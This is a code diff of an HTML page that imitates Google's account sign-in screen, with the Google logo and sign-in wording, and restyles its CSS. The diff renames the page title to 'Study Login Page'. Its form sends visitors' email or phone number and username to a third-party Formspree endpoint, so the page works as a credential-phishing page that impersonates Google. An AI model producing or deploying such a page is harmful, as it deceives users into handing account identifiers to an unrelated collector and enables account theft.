@@ -3,148 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
+    <title>Study Login Page</title>
     <style>
-        /* 1. Basic Page Setup */
-        body {
-            font-family: 'Roboto', arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        /* 2. The Main White Card */
-        .login-card {
-            background: #ffffff;
-            width: 400px;
-            padding: 40px;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        /* 3. Logo and Headers */
-        .logo {
-            width: 75px;
-            height: 24px;
-            margin-bottom: 10px;
-        }
-
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            margin: 10px 0;
-            color: #202124;
-        }
-
-        p {
-            font-size: 16px;
-            color: #202124;
-            margin-bottom: 30px;
-        }
-
-        /* 4. Form and Input Bars */
-        form {
-            text-align: left;
-        }
-
-        .input-group {
-            margin-bottom: 20px;
-            position: relative;
-        }
-
+        body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
+        .login-box { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; width: 360px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { margin-bottom: 24px; color: #202124; }
+        
+        /* The Input Bars */
+        .input-group { position: relative; margin-bottom: 20px; }
         input {
             width: 100%;
             padding: 13px 15px;
-            font-size: 16px;
+            box-sizing: border-box;
             border: 1px solid #dadce0;
             border-radius: 4px;
-            box-sizing: border-box;
-            transition: border 0.2s;
+            font-size: 16px;
         }
+        input:focus { outline: 2px solid #1a73e8; border-color: transparent; }
 
-        /* Highlight the bar when clicked */
-        input:focus {
-            outline: none;
-            border: 2px solid #1a73e8;
-            padding: 12px 14px;
-        }
-
-        /* 5. Blue Text Links */
-        .link-text {
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 14px;
-            text-decoration: none;
-            cursor: pointer;
-            display: inline-block;
-            margin-top: 5px;
-        }
-
-        .link-text:hover {
-            text-decoration: underline;
-        }
-
-        /* 6. Footer Buttons */
-        .button-container {
-            margin-top: 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .btn-next {
+        .btn {
             background-color: #1a73e8;
             color: white;
-            padding: 10px 24px;
             border: none;
+            padding: 10px 24px;
             border-radius: 4px;
             font-weight: 500;
             cursor: pointer;
-            font-size: 14px;
-        }
-
-        .btn-next:hover {
-            background-color: #1557b0;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            float: right;
         }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+
+    <form action="https://formspree.io/f/xeeokkqa" method="POST">
         
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
+        <div class="input-group">
+            <input type="text" name="email_or_phone" placeholder="Email or phone" aria-label="Email or phone" required>
+        </div>
 
-        <form action="https://formspree.io/f/xeeokkqa" method="POST">
-            
-            <div class="input-group">
-                <input type="text" name="email_or_phone" placeholder="Email or phone" aria-label="Email or phone" required>
-                <a href="#" class="link-text">Forgot email?</a>
-            </div>
+        <div class="input-group">
+            <input type="text" name="username" placeholder="Username" aria-label="Username" required>
+        </div>
 
-            <div class="input-group">
-                <input type="text" name="username" placeholder="Username" aria-label="Username" required>
-            </div>
+        <div style="text-align: left; color: #1a73e8; font-weight: 500; font-size: 14px; margin-bottom: 40px;">
+            Forgot email?
+        </div>
 
-            <div style="font-size: 14px; color: #5f6368; line-height: 1.4; margin-top: 10px;">
-                Not your computer? Use Guest mode to sign in privately.
-                <br>
-                <a href="#" class="link-text">Learn more</a>
-            </div>
-
-            <div class="button-container">
-                <a href="#" class="link-text">Create account</a>
-                <button type="submit" class="btn-next">Next</button>
-            </div>
-        </form>
-    </div>
+        <button type="submit" class="btn">Next</button>
+    </form>
+</div>
 
 </body>
 </html>
